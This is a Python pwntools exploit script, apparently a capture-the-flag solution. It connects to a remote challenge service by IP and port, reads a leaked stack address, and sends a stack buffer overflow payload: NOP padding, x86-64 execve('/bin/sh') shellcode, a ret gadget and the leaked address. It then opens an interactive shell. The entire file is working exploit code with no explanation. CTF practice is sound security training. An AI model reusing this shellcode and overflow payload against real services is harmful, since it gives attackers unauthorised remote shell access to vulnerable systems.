from pwn import *
elf = ELF("./challenge")
context(os="linux", arch="amd64")

# p = elf.process()
p = remote("45.76.177.238", 9332)
offset = 72
p.recvuntil(b"stack?\n")
out = p.recvline()
# print(out)
out = out.split(b" ")
out = int(out[-1], 16)
# print(hex(out))
shellcode = b"\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05" # shellcode
shellcodelen = len(shellcode)
garbagelen = offset - shellcodelen
payload =  b"\x90"*garbagelen # Garbage
payload += shellcode
payload += p64(0x4012fe) # ret gadget
payload += p64(out) # Address of stack
p.sendline(payload)
p.interactive()